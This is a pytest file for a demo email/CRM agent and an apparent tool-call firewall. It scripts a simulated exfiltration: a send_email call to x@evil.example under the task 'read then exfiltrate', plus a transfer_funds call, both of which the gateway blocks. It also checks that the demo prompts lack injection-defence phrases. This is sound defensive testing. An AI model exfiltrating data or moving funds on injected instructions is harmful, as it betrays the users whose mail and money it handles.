"""Tests for the demo agent loop, backends and tool-call parsing (no real LLM)."""

from __future__ import annotations

import pytest
from demo.agent import (
    DemoAgent,
    DirectBackend,
    GatewayBackend,
    make_world_executor,
    parse_tool_calls,
    system_prompt,
)
from demo.world import World
from tests.demo.conftest import FakeGateway, make_llm

# --------------------------------------------------------------------------- parsing


def test_parse_native_tool_calls():
    msg = {
        "role": "assistant",
        "content": "",
        "tool_calls": [{"id": "x", "type": "function",
                        "function": {"name": "read_email", "arguments": '{"email_id": "E001"}'}}],
    }
    calls = parse_tool_calls(msg)
    assert calls == [{"id": "x", "name": "read_email", "arguments": {"email_id": "E001"}}]


def test_parse_tool_call_from_tagged_text():
    msg = {"role": "assistant",
           "content": 'ok <tool_call>{"name": "list_emails", "arguments": {"folder": "sent"}}</tool_call>'}
    calls = parse_tool_calls(msg)
    assert calls[0]["name"] == "list_emails" and calls[0]["arguments"] == {"folder": "sent"}


def test_parse_tool_call_nested_function():
    msg = {"role": "assistant",
           "content": '{"function": {"name": "get_customer", "arguments": {"customer_id": "C001"}}}'}
    calls = parse_tool_calls(msg)
    assert calls[0]["name"] == "get_customer"


def test_parse_ignores_unknown_tool_name():
    msg = {"role": "assistant", "content": '{"name": "rm_rf", "arguments": {}}'}
    assert parse_tool_calls(msg) == []


def test_parse_plain_text_no_calls():
    assert parse_tool_calls({"role": "assistant", "content": "just a summary"}) == []


def test_parse_arguments_as_json_string():
    msg = {"role": "assistant", "content": "",
           "tool_calls": [{"id": "1", "function": {"name": "read_email", "arguments": '{"email_id":"E002"}'}}]}
    assert parse_tool_calls(msg)[0]["arguments"] == {"email_id": "E002"}


# --------------------------------------------------------------------------- prompts


def test_system_prompts_have_no_injection_defence():
    for lang in ("en", "ar"):
        p = system_prompt(lang).lower()
        assert "najd" in p or "نجد" in system_prompt(lang)
        for banned in ("ignore", "injection", "do not follow", "لا تتبع", "تجاهل"):
            assert banned not in p


def test_system_prompt_language():
    assert "CRM" in system_prompt("en") or "crm" in system_prompt("en").lower()
    assert "نجد" in system_prompt("ar")


# --------------------------------------------------------------------------- direct backend loop


async def test_direct_backend_single_tool_then_reply():
    world = World()
    client = make_llm([
        {"tool": "read_email", "arguments": {"email_id": "E001"}},
        {"text": "Invoice summary ready."},
    ])
    agent = DemoAgent(backend=DirectBackend(world), http_client=client, session_id="t")
    transcript = await agent.run("summarise E001")
    assert transcript.stopped_reason == "completed"
    assert len(transcript.steps) == 1
    assert transcript.steps[0].tool == "read_email"
    assert transcript.steps[0].blocked is False
    assert transcript.reply == "Invoice summary ready."
    assert transcript.protected is False


async def test_direct_backend_executes_side_effects():
    world = World()
    client = make_llm([
        {"tool": "send_email", "arguments": {"to": "a@x.example", "subject": "s", "body": "b"}},
        {"text": "sent"},
    ])
    agent = DemoAgent(backend=DirectBackend(world), http_client=client, session_id="t")
    await agent.run("send a mail")
    assert len(world.outbox) == 1


async def test_direct_backend_tool_error_recorded():
    world = World()
    client = make_llm([
        {"tool": "read_email", "arguments": {"email_id": "E999"}},
        {"text": "could not read"},
    ])
    agent = DemoAgent(backend=DirectBackend(world), http_client=client, session_id="t")
    transcript = await agent.run("read E999")
    assert "Error" in transcript.steps[0].result_preview


async def test_loop_caps_at_max_steps():
    world = World()
    # Always ask for a tool call; the loop must stop at max_steps.
    client = make_llm([{"tool": "list_emails", "arguments": {}}])
    agent = DemoAgent(backend=DirectBackend(world), http_client=client, session_id="t", max_steps=3)
    transcript = await agent.run("loop forever")
    assert len(transcript.steps) == 3
    assert transcript.stopped_reason in {"max_steps", "max_rounds", "completed"}


# --------------------------------------------------------------------------- gateway backend


async def test_gateway_backend_allows_and_blocks():
    world = World()
    gateway = FakeGateway(deny_tools={"send_email"})
    backend = GatewayBackend(gateway, "email-crm-assistant", "s1", make_world_executor(world))
    client = make_llm([
        {"tool": "read_email", "arguments": {"email_id": "E001"}},
        {"tool": "send_email", "arguments": {"to": "x@evil.example", "subject": "s", "body": "b"}},
        {"text": "The send was blocked by the firewall."},
    ])
    agent = DemoAgent(backend=backend, http_client=client, session_id="s1")
    transcript = await agent.run("read then exfiltrate")
    assert transcript.protected is True
    assert transcript.steps[0].decision["action"] == "allow"
    assert transcript.steps[1].decision["action"] == "deny"
    assert transcript.steps[1].blocked is True
    # The dangerous action never reached the world.
    assert world.outbox == []


async def test_gateway_block_message_tells_model_why():
    world = World()
    gateway = FakeGateway(deny_tools={"transfer_funds"})
    backend = GatewayBackend(gateway, "email-crm-assistant", "s1", make_world_executor(world))
    client = make_llm([
        {"tool": "transfer_funds", "arguments": {"to_iban": "SA1", "amount_sar": 50}},
        {"text": "blocked"},
    ])
    agent = DemoAgent(backend=backend, http_client=client, session_id="s1")
    transcript = await agent.run("transfer money")
    assert "BLOCKED" in transcript.steps[0].result_preview
    assert "external sink" in transcript.steps[0].result_preview
    assert world.transfers == []


async def test_make_world_executor_returns_toolresult():
    world = World()
    executor = make_world_executor(world)
    from mirsad.models import ToolCall
    res = await executor(ToolCall(session_id="s", agent_id="a", tool="read_email",
                                  arguments={"email_id": "E001"}))
    assert res.is_error is False
    assert res.structured["id"] == "E001"


async def test_make_world_executor_reports_errors():
    world = World()
    executor = make_world_executor(world)
    from mirsad.models import ToolCall
    res = await executor(ToolCall(session_id="s", agent_id="a", tool="read_email",
                                  arguments={"email_id": "E999"}))
    assert res.is_error is True and "Error" in res.content


def test_demo_agent_requires_backend():
    with pytest.raises(ValueError, match="backend"):
        DemoAgent(backend=None)
